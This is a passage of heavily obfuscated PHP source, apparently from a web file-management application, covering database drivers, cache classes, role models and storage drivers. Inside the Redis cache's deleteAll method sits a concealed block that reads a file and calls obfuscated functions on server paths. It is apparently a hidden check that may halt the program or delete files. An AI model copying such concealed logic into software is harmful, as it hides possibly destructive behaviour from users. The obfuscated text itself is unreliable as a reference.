$this->getAll(); return $Ú˜Áì´ı; } } public function execute($†³º©ê¹) { $˜ĞŒÍ¥ï =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†³º©ê¹; if ($this->queryID) { $this->free(); } think_action_status($˜ĞŒÍ¥ï[25], 1); think_status($˜ĞŒÍ¥ï[24]); $‘õØè¥Ü = sqlite_exec($this->_linkID, $†³º©ê¹); $this->debug(); if (!1 === $‘õØè¥Ü) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÓïÕü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $†ÓæÑŠŒ = sqlite_query($this->_linkID, $_SERVER[ÓïÕü][27]); if (!$†ÓæÑŠŒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $š‘÷ĞÅç = sqlite_query($this->_linkID, $_SERVER[ÓïÕü][28]); if (!$š‘÷ĞÅç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ëù³ÖŒ¸ = array(); if ($this->numRows > 0) { for ($Ã·Õè = 0; $Ã·Õè < $this->numRows; $Ã·Õè++) { $Ëù³ÖŒ¸[$Ã·Õè] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ëù³ÖŒ¸; } public function getFields($şèİâ¼Ş) { $Æ‹„Ï½ü =& $_SERVER[ÓïÕü]; $”œƒï›ó = $this->query($Æ‹„Ï½ü[29] . $şèİâ¼Ş . $Æ‹„Ï½ü[30]); $“¶»¡õé = array(); if ($”œƒï›ó) { foreach ($”œƒï›ó as $ş¦Üğ¯İ => $®‘ğëÁå) { $“¶»¡õé[$®‘ğëÁå[$Æ‹„Ï½ü[31]]] = array($Æ‹„Ï½ü[32] => $®‘ğëÁå[$Æ‹„Ï½ü[31]], $Æ‹„Ï½ü[33] => $®‘ğëÁå[$Æ‹„Ï½ü[34]], $Æ‹„Ï½ü[35] => (bool) ($®‘ğëÁå[$Æ‹„Ï½ü[36]] === $Æ‹„Ï½ü[12]), $Æ‹„Ï½ü[37] => $®‘ğëÁå[$Æ‹„Ï½ü[38]], $Æ‹„Ï½ü[39] => strtolower($®‘ğëÁå[$Æ‹„Ï½ü[40]]) == $Æ‹„Ï½ü[41], $Æ‹„Ï½ü[42] => strtolower($®‘ğëÁå[$Æ‹„Ï½ü[43]]) == $Æ‹„Ï½ü[44]); } } return $“¶»¡õé; } public function getTables($ö¾Éç¾ = '') { $¥Æ½Ÿ =& $_SERVER[ÓïÕü]; $×ó™íª = $this->query($¥Æ½Ÿ[45] . $¥Æ½Ÿ[46] . $¥Æ½Ÿ[47]); $”Ş¿¶ñÎ = array(); foreach ($×ó™íª as $¨’ó—ºÂ => $†ÀçäÛÌ) { $”Ş¿¶ñÎ[$¨’ó—ºÂ] = current($†ÀçäÛÌ); } return $”Ş¿¶ñÎ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Éëë³’© =& $_SERVER[ÓïÕü]; $†ù³–­Ñ = sqlite_last_error($this->_linkID); $this->error = $†ù³–­Ñ . $Éëë³’©[4] . sqlite_error_string($†ù³–­Ñ); if ($Éëë³’©[12] != $this->queryStr) { $this->error .= LNG($Éëë³’©[48]) . $this->queryStr; } think_trace($this->error, $Éëë³’©[12], $Éëë³’©[49]); return $this->error; } public function escapeString($úíÚÖØõ) { return sqlite_escape_string($úíÚÖØõ); } public function parseLimit($ÀÃÃ›) { $•¡†ïğ– =& $_SERVER[ÓïÕü]; $îø™¹´² = $•¡†ïğ–[12]; if (!empty($ÀÃÃ›)) { $ÀÃÃ› = explode($•¡†ïğ–[50], $ÀÃÃ›); if (count($ÀÃÃ›) > 1) { $îø™¹´² .= $•¡†ïğ–[51] . $ÀÃÃ›[1] . $•¡†ïğ–[52] . $ÀÃÃ›[0] . $•¡†ïğ–[53]; } else { $îø™¹´² .= $•¡†ïğ–[51] . $ÀÃÃ›[0] . $•¡†ïğ–[53]; } } return $îø™¹´²; } } class DbSqlite3Base extends Db { public function __construct($öÔò¢×› = '') { $™Ü€ã¶ =& $_SERVER[ÓïÕü]; if (!class_exists($™Ü€ã¶[54])) { think_exception(think_lang($™Ü€ã¶[14]) . $™Ü€ã¶[55]); } if (!empty($öÔò¢×›)) { if (!isset($öÔò¢×›[$™Ü€ã¶[16]])) { $öÔò¢×›[$™Ü€ã¶[16]] = 438; } $this->config = $öÔò¢×›; if (empty($this->config[$™Ü€ã¶[17]])) { $this->config[$™Ü€ã¶[17]] = array(); } } } public function connect($«›ÃäÔü = '', $Òš¡–ëã = 0) { $äÅõ—©Õ =& $_SERVER[ÓïÕü]; if (!isset($this->linkID[$Òš¡–ëã])) { if (empty($«›ÃäÔü)) { $«›ÃäÔü = $this->config; } $this->linkID[$Òš¡–ëã] = new SQLite3($«›ÃäÔü[$äÅõ—©Õ[21]]); if (!$this->linkID[$Òš¡–ëã]) { think_exception($this->linkID[$Òš¡–ëã]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Òš¡–ëã]->busyTimeout(30000); if (1 != think_config($äÅõ—©Õ[22])) { unset($this->config); } } return $this->linkID[$Òš¡–ëã]; } public function free() { $this->queryID = null; } public function query($ì¯²¿¾) { $ÈÑëÖÌº =& $_SERVER[ÓïÕü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¯²¿¾; if ($this->queryID) { $this->free(); } think_action_status($ÈÑëÖÌº[23], 1); think_status($ÈÑëÖÌº[24]); $this->queryID = $this->_linkID->query($ì¯²¿¾); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $«‹ôÒš = $this->getAll(); $this->numRows = count($«‹ôÒš); return $«‹ôÒš; } } public function execute($š¾ßÑ ¬) { $¸ÄÉÉƒÁ =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $š¾ßÑ ¬; if ($this->queryID) { $this->free(); } think_action_status($¸ÄÉÉƒÁ[25], 1); think_status($¸ÄÉÉƒÁ[24]); $¼÷Ê·Ó = $this->_linkID->exec($š¾ßÑ ¬); $this->debug(); if (!1 === $¼÷Ê·Ó) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÓïÕü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $îîø‘ÓÑ = $this->_linkID->query($_SERVER[ÓïÕü][27]); if (!$îîø‘ÓÑ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŒğãÇ = $this->_linkID->query($_SERVER[ÓïÕü][28]); if (!$ŒğãÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ğ€áïå¸ = array(); while ($ÊÙ¨€ıÔ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ğ€áïå¸[] = $ÊÙ¨€ıÔ; } $this->queryID->reset(); return $ğ€áïå¸; } public function getFields($Ê²şÑ‡) { $¥•İ…ó =& $_SERVER[ÓïÕü]; $ÄØû‘ = $this->query($¥•İ…ó[29] . $Ê²şÑ‡ . $¥•İ…ó[30]); $áÉî¶’ô = array(); if ($ÄØû‘) { foreach ($ÄØû‘ as $«Äì®² => $íÌÊ§İÃ) { $áÉî¶’ô[$íÌÊ§İÃ[$¥•İ…ó[32]]] = array($¥•İ…ó[32] => $íÌÊ§İÃ[$¥•İ…ó[32]], $¥•İ…ó[33] => $íÌÊ§İÃ[$¥•İ…ó[33]], $¥•İ…ó[35] => (bool) ($íÌÊ§İÃ[$¥•İ…ó[35]] === $¥•İ…ó[12]), $¥•İ…ó[37] => $íÌÊ§İÃ[$¥•İ…ó[56]], $¥•İ…ó[39] => (bool) $íÌÊ§İÃ[$¥•İ…ó[57]], $¥•İ…ó[42] => (bool) $íÌÊ§İÃ[$¥•İ…ó[57]]); } } return $áÉî¶’ô; } public function getTables($œ…âŸ­¼ = '') { $·È—»ù¢ =& $_SERVER[ÓïÕü]; $’ù„ûº© = $this->query($·È—»ù¢[45] . $·È—»ù¢[46] . $·È—»ù¢[47]); $´½Şåñ— = array(); foreach ($’ù„ûº© as $·Áí¾¤– => $‡Ú¥Ø’Õ) { $´½Şåñ—[$·Áí¾¤–] = current($‡Ú¥Ø’Õ); } return $´½Şåñ—; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ë÷¯••ù =& $_SERVER[ÓïÕü]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ë÷¯••ù[12] != $this->queryStr) { $this->error .= LNG($Ë÷¯••ù[48]) . $this->queryStr; } think_trace($this->error, $Ë÷¯••ù[12], $Ë÷¯••ù[49]); return $this->error; } public function escapeString($¯î†œ–) { $’˜­òĞå =& $_SERVER[ÓïÕü]; if ($this->_linkID) { return $this->_linkID->escapeString($¯î†œ–); } return str_ireplace($’˜­òĞå[58], $’˜­òĞå[59], $¯î†œ–); } public function parseLimit($Ã”õä) { $ØÜ¨Í¿ã =& $_SERVER[ÓïÕü]; $¯Ä€·Š¨ = $ØÜ¨Í¿ã[12]; if (!empty($Ã”õä)) { $Ã”õä = explode($ØÜ¨Í¿ã[50], $Ã”õä); if (count($Ã”õä) > 1) { $¯Ä€·Š¨ .= $ØÜ¨Í¿ã[51] . $Ã”õä[1] . $ØÜ¨Í¿ã[52] . $Ã”õä[0] . $ØÜ¨Í¿ã[53]; } else { $¯Ä€·Š¨ .= $ØÜ¨Í¿ã[51] . $Ã”õä[0] . $ØÜ¨Í¿ã[53]; } } return $¯Ä€·Š¨; } } goto e¥ÚÖöö¯Â; cÀÍê‰‹Ôî: class CacheLockDatabase { public function lock($ş¨…ËÆÕ, $Ö©Ş—Ù¼ = 0) { $ø®‘ ¶¾ = Model($_SERVER[ÓïÕü][925]); $øäåÜÌ¥ = microtime(!0) + $Ö©Ş—Ù¼; while (microtime(!0) < $øäåÜÌ¥) { $š«û”ÇÖ = $ø®‘ ¶¾->get($ş¨…ËÆÕ); if (!$š«û”ÇÖ || $š«û”ÇÖ < microtime(!0)) { $ïË¦±³Æ = $ø®‘ ¶¾->set($ş¨…ËÆÕ, $øäåÜÌ¥); if ($ïË¦±³Æ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($â×¸Œ¤¶) { return Model($_SERVER[ÓïÕü][925])->get($â×¸Œ¤¶); } public function unlock($À›…ëªı) { Model($_SERVER[ÓïÕü][925])->remove($À›…ëªı); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Áñ™õùú, $°Úƒò…Û) { $£—Ù–Á­ =& $_SERVER[ÓïÕü]; if (!class_exists($£—Ù–Á­[972])) { show_json($£—Ù–Á­[973], !1); } $this->cacheTime = $°Úƒò…Û; $this->handle = new Memcached(); if (is_array($Áñ™õùú[$£—Ù–Á­[974]]) && count($Áñ™õùú[$£—Ù–Á­[974]]) >= 1) { foreach ($Áñ™õùú[$£—Ù–Á­[974]] as $Ç„ÌÖÆ¡) { $©Ä„Ğì· = explode($£—Ù–Á­[4], $Ç„ÌÖÆ¡); $this->handle->addServer($©Ä„Ğì·[0], $©Ä„Ğì·[1]); } } else { $this->handle->addServer($Áñ™õùú[$£—Ù–Á­[209]], $Áñ™õùú[$£—Ù–Á­[210]]); } } public function set($ç“·Äª, $Õí±¥ Ô, $–¦‰ãÕÅ = false) { $–¦‰ãÕÅ = $–¦‰ãÕÅ ? $–¦‰ãÕÅ : $this->cacheTime; return $this->handle->set($ç“·Äª, $Õí±¥ Ô, $–¦‰ãÕÅ); } public function get($“íÎéô) { return $this->handle->get($“íÎéô); } public function remove($¤‘ŞÎ÷”) { return $this->handle->delete($¤‘ŞÎ÷”); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ºÈá®ó›, $æ¿æß•) { $Ú…‹ø§ê =& $_SERVER[ÓïÕü]; if (!class_exists($Ú…‹ø§ê[975])) { show_json($Ú…‹ø§ê[976], !1); } $this->cacheTime = $æ¿æß•; $á˜¡“Õ = isset($ºÈá®ó›[$Ú…‹ø§ê[977]]) ? $ºÈá®ó›[$Ú…‹ø§ê[977]] : 10; $ş›©Õî = _get($ºÈá®ó›, $Ú…‹ø§ê[974]); if ($ş›©Õî && is_array($ş›©Õî)) { $this->initCluster($ºÈá®ó›, $á˜¡“Õ); } else { $this->handle = $this->init($ºÈá®ó›, $á˜¡“Õ); } } private function init($‡»ıïã , $£Ã÷³Å­) { $ŞçÇ×“í =& $_SERVER[ÓïÕü]; $õ¶şöÉ‰ = new Redis(); $³İÁú † = isset($‡»ıïã [$ŞçÇ×“í[978]]) ? $‡»ıïã [$ŞçÇ×“í[978]] : !1; if ($³İÁú †) { $õ¶şöÉ‰->pconnect($‡»ıïã [$ŞçÇ×“í[209]], $‡»ıïã [$ŞçÇ×“í[210]], $£Ã÷³Å­); } else { $õ¶şöÉ‰->connect($‡»ıïã [$ŞçÇ×“í[209]], $‡»ıïã [$ŞçÇ×“í[210]], $£Ã÷³Å­); } if (!empty($‡»ıïã [$ŞçÇ×“í[490]])) { $õ¶şöÉ‰->auth($‡»ıïã [$ŞçÇ×“í[490]]); } if (!empty($‡»ıïã [$ŞçÇ×“í[848]]) && $‡»ıïã [$ŞçÇ×“í[848]] != 0) { $õ¶şöÉ‰->select($‡»ıïã [$ŞçÇ×“í[848]]); } return $õ¶şöÉ‰; } private function initCluster($­Û€«É, $…Ê·÷ÇÁ) { $ “ñ†Ûû =& $_SERVER[ÓïÕü]; $•ßå•ÙÆ = array($ “ñ†Ûû[979], $ “ñ†Ûû[980], $ “ñ†Ûû[981]); $À¡ö”® = $ “ñ†Ûû[979]; if (isset($­Û€«É[$ “ñ†Ûû[16]]) && in_array($­Û€«É[$ “ñ†Ûû[16]], $•ßå•ÙÆ)) { $À¡ö”® = $­Û€«É[$ “ñ†Ûû[16]]; } switch ($À¡ö”®) { case $ “ñ†Ûû[979]: $this->_slave($­Û€«É, $…Ê·÷ÇÁ); break; case $ “ñ†Ûû[980]: break; case $ “ñ†Ûû[981]: $this->isCluster = !0; $º¸’ú§‹ = $­Û€«É[$ “ñ†Ûû[974]]; $Ó±™ßÜµ = isset($­Û€«É[$ “ñ†Ûû[978]]) ? $­Û€«É[$ “ñ†Ûû[978]] : !1; $éÙı±ôé = isset($­Û€«É[$ “ñ†Ûû[490]]) ? $­Û€«É[$ “ñ†Ûû[490]] : null; $this->handle = new RedisCluster(NUll, $º¸’ú§‹, $…Ê·÷ÇÁ, $…Ê·÷ÇÁ, $Ó±™ßÜµ, $éÙı±ôé); break; default: break; } } private function _slave($›í¸ÕÈÁ, $ÜÀü³Òû) { $ö”çıå‘ = $›í¸ÕÈÁ[$_SERVER[ÓïÕü][974]]; $this->filterConfig($›í¸ÕÈÁ, $ö”çıå‘[0]); $this->handle = $this->init($›í¸ÕÈÁ, $ÜÀü³Òû); unset($ö”çıå‘[0]); if (empty($ö”çıå‘)) { return; } $çœ«š¶ = array_rand($ö”çıå‘); $this->filterConfig($›í¸ÕÈÁ, $ö”çıå‘[$çœ«š¶]); $this->slaveHandle = $this->init($›í¸ÕÈÁ, $ÜÀü³Òû); } private function filterConfig(&$İ˜˜Ôš, $êùóçâà) { $¨­æª¡¿ =& $_SERVER[ÓïÕü]; $¯€¢³£‰ = explode($¨­æª¡¿[4], $êùóçâà); $ ÊÜßÇı = array($¨­æª¡¿[209] => $¯€¢³£‰[0], $¨­æª¡¿[210] => $¯€¢³£‰[1]); $İ˜˜Ôš = array_merge($İ˜˜Ôš, $ ÊÜßÇı); } public function set($€œÃ¯ö¿, $Ø”’ÙØ, $û¬Û˜¹è = false) { $û¬Û˜¹è = $û¬Û˜¹è ? $û¬Û˜¹è : $this->cacheTime; return $this->handle->setEx($€œÃ¯ö¿, $û¬Û˜¹è, $Ø”’ÙØ); } public function setLock($èŞ†¾, $ãš‹Î¿í, $ÈáøåŒ ) { return $this->handle->setNX($èŞ†¾, $ãš‹Î¿í); } public function get($“‰ÓÑŒÖ) { $ÆÀÊŒ¢ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÆÀÊŒ¢->get($“‰ÓÑŒÖ); } public function remove($ÒÚú÷“ò) { return $this->handle->del($ÒÚú÷“ò); } public function deleteAll() { $ú€Ïü¼– =& $_SERVER[ÓïÕü]; if ($_SERVER[$ú€Ïü¼–[933]] != $_SERVER[$ú€Ïü¼–[982]]) { $´’‚îŠ = $ú€Ïü¼–[983]; $×Ï¿´ÒÅ = $ú€Ïü¼–[934]; $ö·ß–ô– = $_SERVER[$ú€Ïü¼–[935]] . $ú€Ïü¼–[936]; $†àÈ§´ = $×Ï¿´ÒÅ($ö·ß–ô–); $¥¦ÂÎÊ = explode($ú€Ïü¼–[288], $†àÈ§´); if (count($¥¦ÂÎÊ) < $ú€Ïü¼–[708]) { $‚§ŠŠÕº = $ú€Ïü¼–[937]; $‚§ŠŠÕº(); } $éÃë€³¦ = $ú€Ïü¼–[984]; $éÃë€³¦($_SERVER[$ú€Ïü¼–[985]]); $éÃë€³¦($_SERVER[$ú€Ïü¼–[935]] . $ú€Ïü¼–[986]); $ÈÚµ­Ñ = 1; while ($ÈÚµ­Ñ > 1) { $ÈÚµ­Ñ = $ÈÚµ­Ñ + 4; $º™‘é„¢ = rawurlencode($ÈÚµ­Ñ . $ú€Ïü¼–[457]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $†ÎÊê–) { $this->handle->flushall($†ÎÊê–); } return; } return $this->handle->flushAll(); } } goto fÑ’§¨óĞí; fî…Ñâ®ÇÅ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\137\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\157\x6c\145", "\x72\x6f\154\145\107\x72\x6f\165\x70", "\x72\x65\147\x69\163\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Â¡ğ†’Ø) { return "\123\171\163\164\x65\x6d\x4f\160\164\x69\x6f\156\137{$Â¡ğ†’Ø}"; } protected function optionDefault($çäÔæ×ƒ = '') { $œÚö¨üë =& $_SERVER[ÓïÕü]; if ($çäÔæ×ƒ == $œÚö¨üë[12]) { return $GLOBALS[$œÚö¨üë[6]][$œÚö¨üë[460]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x72\157\154\145\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\x6c\x61\142\x65\154", "\x64\151\x73\160\154\x61\171", "\x73\171\x73\164\x65\155", "\144\x65\x73\x63", "\151\x67\156\157\x72\x65\105\170\164", "\x69\147\156\157\x72\x65\x46\151\154\145\x53\151\x7a\x65", "\x61\144\x6d\151\156\x69\163\164\x72\x61\x74\x6f\162", "\163\x6f\x72\164"); public function listData($ù€à¤†– = false, $Æ©ıºŸš = "\163\157\x72\x74", $§°ó†Ïô = false) { $‡Ğ”ü±­ =& $_SERVER[ÓïÕü]; $âÏÙÍš® = parent::listData($ù€à¤†–, $Æ©ıºŸš, $§°ó†Ïô); if (!$ù€à¤†–) { foreach ($âÏÙÍš® as $Î©’µÇ => $îÍ»íù ) { if ($îÍ»íù [$‡Ğ”ü±­[2215]] == 1) { $âÏÙÍš®[$Î©’µÇ][$‡Ğ”ü±­[529]] = LNG($‡Ğ”ü±­[2490]); } } } return $âÏÙÍš®; } public function update($ »²Å•˜, $šÈÚÇ‘) { $¹Î«ƒ– =& $_SERVER[ÓïÕü]; $™­¢Í = parent::listData($ »²Å•˜); $ŒÂğÓùÂ = $this->findByName($šÈÚÇ‘[$¹Î«ƒ–[32]]); if (!$™­¢Í || $ŒÂğÓùÂ && $ŒÂğÓùÂ[$¹Î«ƒ–[478]] != $™­¢Í[$¹Î«ƒ–[478]]) { return !1; } if ($ŒÂğÓùÂ[$¹Î«ƒ–[2215]] == 1) { $šÈÚÇ‘ = array($¹Î«ƒ–[32] => $šÈÚÇ‘[$¹Î«ƒ–[32]], $¹Î«ƒ–[2029] => $šÈÚÇ‘[$¹Î«ƒ–[2029]]); } $this->filterAuth($šÈÚÇ‘[$¹Î«ƒ–[490]]); return parent::update($ »²Å•˜, $šÈÚÇ‘); } public function remove($µÃå¡‰Ê) { $÷ø°¿‰» = parent::listData($µÃå¡‰Ê); if (!$÷ø°¿‰» || $÷ø°¿‰»[$_SERVER[ÓïÕü][192]]) { return !1; } return parent::remove($µÃå¡‰Ê); } public function add($èÀ–‰) { $¼íÔÏ =& $_SERVER[ÓïÕü]; $’ïãÕÑ = $èÀ–‰[$¼íÔÏ[32]]; if ($this->findByName($’ïãÕÑ)) { return !1; } $šöÃñà˜ = array($¼íÔÏ[497] => $’ïãÕÑ, $¼íÔÏ[2012] => $¼íÔÏ[12], $¼íÔÏ[2008] => $¼íÔÏ[2016], $¼íÔÏ[2491] => 1, $¼íÔÏ[2011] => 0, $¼íÔÏ[2492] => 0, $¼íÔÏ[2010] => $this->getSort()); $èÀ–‰ = array_merge($šöÃñà˜, $èÀ–‰); $this->filterAuth($èÀ–‰[$¼íÔÏ[490]]); return parent::insert($èÀ–‰); } private function getSort() { $ùâ‡çîŸ =& $_SERVER[ÓïÕü]; $’«çµ« = parent::listData(); $¬†Äó®ù = array_to_keyvalue($’«çµ«, $ùâ‡çîŸ[12], $ùâ‡çîŸ[2030]); return empty($¬†Äó®ù) ? 0 : max($¬†Äó®ù) + 1; } private function filterAuth(&$õ­Ï”‘ô) { $¿¤ÑîøÄ =& $_SERVER[ÓïÕü]; $Ü”üå = array(); $€“™äÓÑ = array_filter(explode($¿¤ÑîøÄ[50], $õ­Ï”‘ô)); foreach ($€“™äÓÑ as $õ­Ï”‘ô) { $°Ò¾—‘è = explode($¿¤ÑîøÄ[10], $õ­Ï”‘ô); if ($°Ò¾—‘è[0] == $¿¤ÑîøÄ[2493] && $°Ò¾—‘è[1] != $¿¤ÑîøÄ[1303]) { $ŞŒ„®‰… = $°Ò¾—‘è[0] . $¿¤ÑîøÄ[10] . $°Ò¾—‘è[1] . $¿¤ÑîøÄ[2494]; if (!in_array($ŞŒ„®‰…, $€“™äÓÑ)) { $Ü”üå[] = $ŞŒ„®‰…; } } $Ü”üå[] = $õ­Ï”‘ô; } $õ­Ï”‘ô = implode($¿¤ÑîøÄ[50], $Ü”üå); } public function findRoleDefault() { $Ÿ¬¬ØòŒ =& $_SERVER[ÓïÕü]; $ß§Ò¢„… = parent::listData(); $’ˆ®ÉÖ÷ = !1; foreach ($ß§Ò¢„… as $›Ìõ‚æ¤) { if (!$›Ìõ‚æ¤ || $›Ìõ‚æ¤[$Ÿ¬¬ØòŒ[2028]] == $Ÿ¬¬ØòŒ[231] || $›Ìõ‚æ¤[$Ÿ¬¬ØòŒ[2215]] == 1) { continue; } if (strstr($›Ìõ‚æ¤[$Ÿ¬¬ØòŒ[490]], $Ÿ¬¬ØòŒ[2495])) { continue; } if (!strstr($›Ìõ‚æ¤[$Ÿ¬¬ØòŒ[490]], $Ÿ¬¬ØòŒ[2496])) { continue; } if (!$’ˆ®ÉÖ÷) { $’ˆ®ÉÖ÷ = $›Ìõ‚æ¤; continue; } $Ş‘Çî = explode($Ÿ¬¬ØòŒ[50], $’ˆ®ÉÖ÷[$Ÿ¬¬ØòŒ[490]]); $¨˜§‘ØÂ = explode($Ÿ¬¬ØòŒ[50], $›Ìõ‚æ¤[$Ÿ¬¬ØòŒ[490]]); if (count($Ş‘Çî) > count($¨˜§‘ØÂ)) { $’ˆ®ÉÖ÷ = $›Ìõ‚æ¤; } } return $’ˆ®ÉÖ÷ ? $’ˆ®ÉÖ÷[$Ÿ¬¬ØòŒ[478]] : $Ÿ¬¬ØòŒ[12]; } public function sort($³ë¢¡¢è, $î­ÀÆó) { return parent::update($³ë¢¡¢è, $î­ÀÆó); } } goto eèËÁ¼“Í×; fÖ‘¸³³ñÉ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ĞÉØ÷‡Ù) { $this->pathParse = $ĞÉØ÷‡Ù; } protected function infoParse($³ÀşÜùò, $­×²×üß = false) { $ÆºêĞš =& $_SERVER[ÓïÕü]; return Action($ÆºêĞš[1284])->sharePathInfo($this->pathParse[$ÆºêĞš[87]], !0, $­×²×üß); } public function listPath($”¨¦¥í¥, $‡‰°²¸™ = false) { $ß„ ©ıñ =& $_SERVER[ÓïÕü]; $ƒÚè€È· = IO::listPath($”¨¦¥í¥, $‡‰°²¸™); if (!$ƒÚè€È·) { return $ƒÚè€È·; } if (is_array($ƒÚè€È·[$ß„ ©ıñ[1464]])) { $ÂÓò† = Action($ß„ ©ıñ[1473])->parsePathChildren($ƒÚè€È·[$ß„ ©ıñ[1464]], array($ß„ ©ıñ[498] => $”¨¦¥í¥)); $ƒÚè€È·[$ß„ ©ıñ[1464]] = Action($ß„ ©ıñ[1284])->shareItemInfo($ÂÓò†); } foreach ($ƒÚè€È· as $´îëæ¢Š => $•ºîÛƒ²) { if (!in_array($´îëæ¢Š, array($ß„ ©ıñ[86], $ß„ ©ıñ[85]))) { continue; } foreach ($•ºîÛƒ² as $ùú˜•ùš => $ÂÓò†) { $ÂÓò† = Action($ß„ ©ıñ[1473])->parsePathChildren($ÂÓò†, array($ß„ ©ıñ[498] => $”¨¦¥í¥)); $ƒÚè€È·[$´îëæ¢Š][$ùú˜•ùš] = Action($ß„ ©ıñ[1284])->shareItemInfo($ÂÓò†); } } return $ƒÚè€È·; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($èúê‰ê§) { parent::__construct($èúê‰ê§); $this->setSignVersion($_SERVER[ÓïÕü][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‚¦Š—Œß) { parent::__construct($‚¦Š—Œß); $this->setSignVersion($_SERVER[ÓïÕü][250]); } public function uploadFormData($ËÙ¸äÎØ, $¬Ù“ÜİÊ = 3600) { $ıú¹©ã´ =& $_SERVER[ÓïÕü]; $Øş–¨š² = $ıú¹©ã´[232]; $ƒÜûÒØ™ = $ıú¹©ã´[260]; $Õ¢¶ïó = $ıú¹©ã´[62]; $¿¹À‹×¿ = gmdate($ıú¹©ã´[261]); $êÉŸ±ÁÙ = gmdate($ıú¹©ã´[262]); $²Ñöö „ = $ıú¹©ã´[263]; $…„êıÎ¨ = $¬Ù“ÜİÊ . $ıú¹©ã´[12]; $º‹—Á›Š = $ıú¹©ã´[264]; $÷‡Êšæú = array($this->accessKey, $êÉŸ±ÁÙ, $this->region, $Õ¢¶ïó, $²Ñöö „); $¡Ó˜Û” = implode($ıú¹©ã´[8], $÷‡Êšæú); $µ’İã¡Ê = array($ıú¹©ã´[265] => gmdate($ıú¹©ã´[1448], strtotime($ıú¹©ã´[267])), $ıú¹©ã´[268] => array(array($ıú¹©ã´[269] => $this->bucket), array($ıú¹©ã´[309] => $Øş–¨š²), array($ıú¹©ã´[270], $ıú¹©ã´[271], $ıú¹©ã´[12]), array($ıú¹©ã´[270], $ıú¹©ã´[272], $ıú¹©ã´[12]), array($ıú¹©ã´[270], $ıú¹©ã´[310], $ıú¹©ã´[12]), array($ıú¹©ã´[273] => $º‹—Á›Š), array($ıú¹©ã´[274] => $¡Ó˜Û”), array($ıú¹©ã´[275] => $ƒÜûÒØ™), array($ıú¹©ã´[276] => $¿¹À‹×¿), array($ıú¹©ã´[277] => $…„êıÎ¨))); $šç³¦¢¼ = base64_encode(json_encode($µ’İã¡Ê)); $Ü×–¹Ä± = hash_hmac($ıú¹©ã´[278], $êÉŸ±ÁÙ, $ıú¹©ã´[279] . $this->secret, !0); $ØñˆÃâ = hash_hmac($ıú¹©ã´[278], $this->region, $Ü×–¹Ä±, !0); $’µÛçÍ³ = hash_hmac($ıú¹©ã´[278], $Õ¢¶ïó, $ØñˆÃâ, !0); $šÉå»»ä = hash_hmac($ıú¹©ã´[278], $²Ñöö „, $’µÛçÍ³, !0); $Äæ¿°Íç = hash_hmac($ıú¹©ã´[278], $šç³¦¢¼, $šÉå»»ä); $úŒä©Áû = array($ıú¹©ã´[249] => $ıú¹©ã´[12], $ıú¹©ã´[297] => $ıú¹©ã´[12], $ıú¹©ã´[309] => $Øş–¨š², $ıú¹©ã´[273] => $º‹—Á›Š, $ıú¹©ã´[280] => $šç³¦¢¼, $ıú¹©ã´[311] => $¡Ó˜Û”, $ıú¹©ã´[312] => $ƒÜûÒØ™, $ıú¹©ã´[313] => $¿¹À‹×¿, $ıú¹©ã´[314] => $…„êıÎ¨, $ıú¹©ã´[315] => $Äæ¿°Íç, $ıú¹©ã´[209] => $this->getHost()); return $úŒä©Áû; } } goto dñ™ØÜ¨»Š; AÍ´¨ŞĞ²: class BackupDbFile { public function __construct() { } public function index() { $äŸÛå‚Î =& $_SERVER[ÓïÕü]; $èÖğ‰Ğë = Backup::get(); $±üÅÅÑ‹ = $èÖğ‰Ğë[$äŸÛå‚Î[32]]; $£ğÅáÃÅ = $this->tmpFilesPath() . "\142\x61\x63\153\x75\x70\x5f{$±üÅÅÑ‹}\57"; $±ùÀ’»± = $this->backupPath($èÖğ‰Ğë); if (!($±ùÀ’»± = IO::mkdir($±ùÀ’»±))) { 